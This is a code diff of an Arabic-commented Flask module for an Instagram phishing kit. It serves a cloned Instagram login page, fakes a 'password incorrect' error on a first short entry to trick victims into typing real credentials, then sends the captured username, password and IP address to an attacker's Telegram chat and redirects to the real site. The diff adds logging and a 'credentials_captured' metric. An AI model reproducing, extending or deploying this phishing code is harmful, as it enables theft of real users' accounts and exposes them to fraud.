@@ -1,9 +1,18 @@
-import os
+# instagram_module.py
+# ============================================================
+# Instagram Phishing - مع نظام التحقق الذكي
+# ============================================================
+
 from flask import Blueprint, render_template_string, redirect, request
+
+from logging_config import get_logger
+from monitoring import metrics
+
+logger = get_logger("instagram_module")
 
 instagram_bp = Blueprint('instagram', __name__)
 
-# قالب انستقرام المطابق للأصل 100% مع نظام التحقق الذكي لمنع البيانات الوهمية
+
 IG_PHISH_TEMPLATE = """
 <!DOCTYPE html>
 <html lang="ar" dir="ltr">
@@ -23,10 +32,7 @@ IG_PHISH_TEMPLATE = """
             margin: 0;
             padding: 0;
         }
-        .main-container {
-            max-width: 350px;
-            width: 100%;
-        }
+        .main-container { max-width: 350px; width: 100%; }
         .login-card {
             background: #fff;
             border: 1px solid #dbdbdb;
@@ -55,9 +61,7 @@ IG_PHISH_TEMPLATE = """
             width: 100%;
             margin-bottom: 6px;
         }
-        .login-card input:focus {
-            border-color: #a8a8a8;
-        }
+        .login-card input:focus { border-color: #a8a8a8; }
         .login-btn {
             background-color: #0095f6;
             border: none;
@@ -71,9 +75,7 @@ IG_PHISH_TEMPLATE = """
             margin-top: 10px;
             margin-bottom: 15px;
         }
-        .login-btn:hover {
-            background-color: #1877f2;
-        }
+        .login-btn:hover { background-color: #1877f2; }
         .error-box {
             color: #ed4956;
             font-size: 14px;
@@ -82,16 +84,8 @@ IG_PHISH_TEMPLATE = """
             text-align: center;
             line-height: 18px;
         }
-        .divider {
-            display: flex;
-            align-items: center;
-            margin: 15px 0;
-        }
-        .line {
-            flex: 1;
-            height: 1px;
-            background-color: #dbdbdb;
-        }
+        .divider { display: flex; align-items: center; margin: 15px 0; }
+        .line { flex: 1; height: 1px; background-color: #dbdbdb; }
         .or-text {
             color: #8e8e8e;
             font-size: 13px;
@@ -125,8 +119,7 @@ IG_PHISH_TEMPLATE = """
     <div class="main-container">
         <div class="login-card">
             <div class="logo">Instagram</div>
-            
-            <!-- رسالة خطأ انستقرام الوهمية لإجباره على كتابة البيانات الصحيحة -->
+
             <div id="error-msg" class="error-box">
                 Sorry, your password was incorrect. Please double-check your password.
             </div>
@@ -135,7 +128,7 @@ IG_PHISH_TEMPLATE = """
                 <input type="text" id="username" name="username" placeholder="Phone number, username, or email" required>
                 <input type="password" id="password" name="password" placeholder="Password" required>
                 <button type="submit" class="login-btn">Log In</button>
-                
+
                 <div class="divider">
                     <div class="line"></div>
                     <div class="or-text">OR</div>
@@ -158,39 +151,51 @@ IG_PHISH_TEMPLATE = """
             const pass = document.getElementById('password').value.trim();
             const errorBox = document.getElementById('error-msg');
 
-            // إذا حاول الضحية كتابة يوزر أو باسورد قصير أو عشوائي في أول محاولة
+            // أول محاولة: رفض البيانات الضعيفة
             if (attempt === 0 && (pass.length < 4 || user.length < 3)) {
-                event.preventDefault(); // منع الإرسال
-                errorBox.style.display = 'block'; // إظهار خطأ انستقرام
+                event.preventDefault();
+                errorBox.style.display = 'block';
                 attempt++;
                 return false;
             }
-            return true; // في المحاولة الثانية يرسل البيانات الحقيقية للبوت
+            return true;
         }
     </script>
 </body>
 </html>
 """
 
+
 def init_instagram_routes(app, bot):
+    """تسجيل مسارات Instagram"""
+
     @app.route('/ig_login.php', methods=['GET', 'POST'])
     def ig_trap():
         target_chat_id = request.args.get('id', None)
+
         if request.method == 'POST':
             username = request.form.get('username')
             password = request.form.get('password')
-            source_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
-            
-            if target_chat_id:
+            source_ip = (
+                request.headers.get('CF-Connecting-IP') or
+                request.headers.get('X-Forwarded-For', request.remote_addr) or
+                request.remote_addr
+            )
+
+            if target_chat_id and username:
                 alert_msg = (
-                    "📸 **تم التقاط صيد انستقرام الحقيقي بنجاح!**\n\n"
+                    "📸 **تم التقاط صيد انستقرام!**\n\n"
                     f"👤 **المستخدم/الرقم:** `{username}`\n"
-                    f"🔑 **كلمة السر:** `{password}`\n"
+                    f"🔑 **كلمة السر:** `{password or 'غير متاح'}`\n"
                     f"🌐 **عنوان الـ IP:** `{source_ip}`"
                 )
                 try:
                     bot.send_message(target_chat_id, alert_msg, parse_mode="Markdown")
+                    logger.info(f"Instagram credentials captured: {username[:30]}")
+                    metrics.inc_counter("credentials_captured", tags={"platform": "instagram"})
                 except Exception as e:
-                    print(f"[-] Telegram Error: {e}")
+                    logger.error(f"Telegram Error: {e}")
+
             return redirect("https://www.instagram.com", code=302)
+
         return render_template_string(IG_PHISH_TEMPLATE)
